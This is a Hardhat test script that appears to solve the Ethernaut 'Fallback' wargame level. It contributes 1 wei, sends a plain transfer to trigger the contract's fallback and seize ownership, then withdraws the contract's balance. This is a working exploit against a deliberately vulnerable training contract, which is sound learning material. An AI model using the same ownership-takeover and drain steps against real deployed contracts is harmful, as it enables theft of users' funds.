import { expect } from "chai";
import { Contract, Signer } from "ethers";
import { ethers } from "hardhat";
import { createChallenge, submitLevel } from "./utils";
import { loadFixture } from "@nomicfoundation/hardhat-network-helpers";


let accounts: Signer[];
let eoa: Signer;
let attacker: Contract;
let challenge: Contract; // challenge contract
let tx: any;

describe("Fallback", function () {

  async function deployTokenFixture(): Promise<any> {
    accounts = await ethers.getSigners();
    [eoa] = accounts;
    const challengeFactory = await ethers.getContractFactory(`Fallback`);
    const challengeAddress = await createChallenge(
      `0x80934BE6B8B872B364b470Ca30EaAd8AEAC4f63F`
    );
    challenge = await challengeFactory.attach(challengeAddress);

    return { eoa, challenge };
  }

  it("solves the challenge", async function () {
    const { eoa, challenge } = await loadFixture(deployTokenFixture);

    tx = await challenge.contribute({
      value: ethers.utils.parseUnits(`1`, `wei`),
    });
    await tx.wait();

    tx = await eoa.sendTransaction({
      to: challenge.address,
      value: ethers.utils.parseUnits(`1`, `wei`),
    });
    await tx.wait();

    tx = await challenge.withdraw();
    await tx.wait();
  });

  after(async () => {
    expect(await submitLevel(challenge.address), "level not solved").to.be.true;
  });
});
